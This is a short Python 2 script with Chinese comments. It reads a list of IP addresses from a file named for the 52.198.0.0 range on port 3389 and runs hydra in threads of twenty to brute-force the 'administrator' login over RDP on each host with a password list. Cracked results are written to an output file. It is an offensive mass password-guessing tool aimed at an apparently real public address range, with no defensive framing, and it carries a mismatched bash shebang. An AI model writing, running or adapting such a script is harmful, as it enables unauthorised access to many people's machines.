#!/bin/bash
#encoding=utf-8
import os,io
import threading,time



#开始扫描
def start_scan(ip,port):
	cmd="hydra -l administrator -P passwd.txt -vV -o fuck_rdp.txt -t 1 %s rdp" % (ip)
	cmd_info=os.popen(cmd)
	cmd_info_string=cmd_info.read()
	#print cmd_info_string
	#print "ip:%s is scan over !" % (ip)
	

#获取ip地址
def get_ip(file):
	fp=open(file)
	ips=[]
	for line in fp.readlines():
		ips.append(line.strip("\r\n"))
	fp.close()
	return ips



	

if __name__ == "__main__" :
	ips=get_ip("ips-52.198.0.0-3389.txt")
	len_ip=len(ips)
	x=0
	t=[]
	while x+20<len_ip:
		for y in xrange(x,x+20):
			t.append(threading.Thread(target=start_scan,args=(ips[y],'3389',)))
			t[y].start()
		t[y].join()
		x=x+20
	for i in xrange(x,len_ip):
			  t.append(threading.Thread(target=start_scan,args=(ips[i],'3389',)))
			  t[i].start()
		
				
